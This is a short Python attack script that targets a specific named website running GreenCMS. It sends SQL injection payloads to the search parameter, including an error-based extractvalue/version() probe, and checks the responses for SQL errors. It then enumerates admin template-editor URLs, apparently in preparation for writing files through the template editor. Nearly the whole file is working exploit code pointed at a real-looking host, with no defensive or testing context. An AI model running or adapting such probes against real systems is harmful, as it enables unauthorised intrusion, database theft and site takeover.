#!/usr/bin/env python3
"""gz-dichuan GreenCMS known vulns - frontend SQLi + template write
CVE-2019-14530: /index.php?m=search&a=index&keyword=' SQL injection
GreenCMS template editor write: /index.php?m=admin&c=template...
"""
import urllib.request, urllib.parse, re

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}
HOST = "http://gz-dichuan.com"

def fetch(url, timeout=8, data=None):
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None,
                                     headers={**UA, "Content-Type": "application/x-www-form-urlencoded"} if data else UA)
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.read(80000).decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read(5000).decode("utf-8", "ignore")
    except Exception:
        return 0, ""

# GreenCMS search SQLi probes
print("=== GreenCMS search SQLi ===", flush=True)
payloads = [
    "/index.php?m=search&a=index&keyword=%27",
    "/index.php?m=search&a=index&keyword=%27%20or%201=1--%20",
    "/index.php?m=search&a=search&keyword=%27",
    "/index.php?m=search&keyword=%27",
    "/index.php?m=search&a=index&keyword=test%27%20and%20extractvalue(1,concat(0x7e,version()))--%20",
]
for p in payloads:
    code, body = fetch(HOST + p)
    sqlerr = "SQL" in body and ("error" in body.lower() or "syntax" in body.lower() or "MySQL" in body)
    print("%s: %s size=%d sqlerr=%s" % (p[:60], code, len(body), sqlerr), flush=True)

# GreenCMS template editor paths
print("\n=== template editor ===", flush=True)
for p in ["/index.php?m=admin&c=template&a=index", "/index.php?m=admin&c=theme&a=index",
          "/index.php?m=admin&c=template&a=edit", "/index.php?m=admin&c=setting&a=index",
          "/index.php?m=admin&c=config&a=index"]:
    code, body = fetch(HOST + p)
    print("%s: %s size=%d" % (p[:55], code, len(body)), flush=True)
